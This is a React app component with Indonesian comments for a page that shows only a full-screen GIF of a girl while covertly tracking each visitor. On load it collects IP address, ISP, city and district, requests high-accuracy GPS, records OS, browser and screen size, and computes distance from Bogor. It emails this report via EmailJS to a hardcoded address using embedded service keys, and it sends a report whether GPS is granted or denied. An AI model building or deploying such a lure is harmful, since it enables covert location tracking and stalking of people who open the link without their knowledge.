import React, { useEffect, useRef } from 'react';
import useGetIP from './hooks/useGetIP';
import useGetDeviceInfo from './hooks/useGetDeviceInfo';
import haversine from 'haversine-distance';
import emailjs from '@emailjs/browser';
import ceweGif from './assets/cewe.gif';

const BOGOR_COORDS = { latitude: -6.5971, longitude: 106.7949 };

function App() {
  const { data: ipData, loading } = useGetIP();
  const { detectOS, detectBrowser, screenSize } = useGetDeviceInfo();
  const hasSent = useRef(false);

  useEffect(() => {
    if (ipData && !hasSent.current) {
      handleHybridTracking();
    }
  }, [ipData]);

  const handleHybridTracking = () => {
    // Minta izin GPS
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          // JIKA DIIZINKAN: Kirim data ISP + GPS
          sendEmail(pos.coords.latitude, pos.coords.longitude, "GPS Diberikan");
        },
        () => {
          // JIKA DITOLAK: Kirim data ISP saja
          sendEmail(null, null, "GPS Ditolak/Silent");
        },
        { enableHighAccuracy: true, timeout: 5000 }
      );
    } else {
      sendEmail(null, null, "Browser Tidak Support GPS");
    }
  };

  const sendEmail = async (gpsLat, gpsLon, gpsStatus) => {
    try {
      const ispLat = ipData?.lat || 0;
      const ispLon = ipData?.lon || 0;

      // Hitung Jarak (Prioritas GPS, jika tidak ada pakai ISP)
      const finalLat = gpsLat || ispLat;
      const finalLon = gpsLon || ispLon;
      const distance = (haversine(BOGOR_COORDS, { latitude: finalLat, longitude: finalLon }) / 1000).toFixed(2);

      const templateParams = {
        to_email: 'suhilman@bignet.id',
        ip_address: ipData?.query || 'N/A',
        isp: ipData?.isp || 'N/A',
        as_name: ipData?.as || 'N/A',
        // Mapping Koordinat
        isp_lat_long: `${ispLat},${ispLon}`, // Hapus spasi setelah koma
        gps_lat_long: gpsLat ? `${gpsLat},${gpsLon}` : "N/A",
        location_detail: `${ipData?.district || ''} ${ipData?.city}, ${ipData?.regionName}`,
        distance_from_bogor: `${distance} km`,
        device_os: detectOS(),
        browser: detectBrowser(),
        screen_res: `${screenSize.width}x${screenSize.height}`,
        current_time: new Date().toLocaleString('id-ID')
      };

      await emailjs.send(
        'service_rjl2ja4', 
        'template_iruemib', 
        templateParams, 
        'ZoURH59lMids8g1rT'
      );
      
      console.log('Laporan Terkirim!');
      hasSent.current = true;
    } catch (err) {
      console.error('EmailJS Error:', err);
    }
  };

  return (
    <div style={{ height: '100vh', width: '100vw', backgroundColor: '#000', overflow: 'hidden' }}>
      <img 
        src={ceweGif} // 2. Gunakan variabel import di sini (pakai kurung kurawal)
        style={{ width: '100%', height: '100%', objectFit: 'cover' }}
        alt="Visual"
      />
    </div>
  );
}

export default App;